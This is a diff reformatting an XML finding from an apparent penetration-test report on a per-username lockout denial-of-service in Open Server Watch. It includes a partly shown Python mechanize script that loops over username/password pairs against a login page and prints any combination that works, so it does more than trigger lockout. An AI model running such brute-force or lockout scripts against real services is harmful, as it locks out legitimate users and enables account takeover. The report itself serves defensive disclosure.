@@ -1,14 +1,15 @@
-<finding id="dos" threatLevel="Low" type="Denial of Service" number="03">
-	<title>Denial of Service</title>
+<?xml version="1.0" encoding="utf-8"?>
+<finding id="dos" number="03" threatLevel="Low" type="Denial of Service">
+  <title>Denial of Service</title>
 
-	<description>
-	<p>The bruteforce hammering protection of Open Server Watch sets timeouts on a per-username basis. An attacker could automatically hit the server repeatedly with relevant usernames (e.g. "admin") in order to lock out those users from logging in.</p>
-	</description>
-	
-	<technicaldescription>
-	<p>The following python script repeatedly attempts to login as the admin user:</p>
-							
-	<code>#!/usr/bin/python
+  <description>
+    <p>The bruteforce hammering protection of Open Server Watch sets timeouts on a per-username basis. An attacker could automatically hit the server repeatedly with relevant usernames (e.g. "admin") in order to lock out those users from logging in.</p>
+  </description>
+
+  <technicaldescription>
+    <p>The following python script repeatedly attempts to login as the admin user:</p>
+
+    <code>#!/usr/bin/python
 import mechanize 
  
 mech = mechanize.Browser()
@@ -26,9 +27,9 @@ for u, p in users:
 	if response.geturl() == 'https://osw.sittingduck.bv/login_success.html':
 		print 'User/Password combo: ',''.join([u, '/', p])
 		break</code>
-	</technicaldescription>
+  </technicaldescription>
 
-	<recommendation>
-	<p>Unfortunately, no patch for this issue this exists upstream.</p>
-	</recommendation>
+  <recommendation>
+    <p>Unfortunately, no patch for this issue this exists upstream.</p>
+  </recommendation>
 </finding>
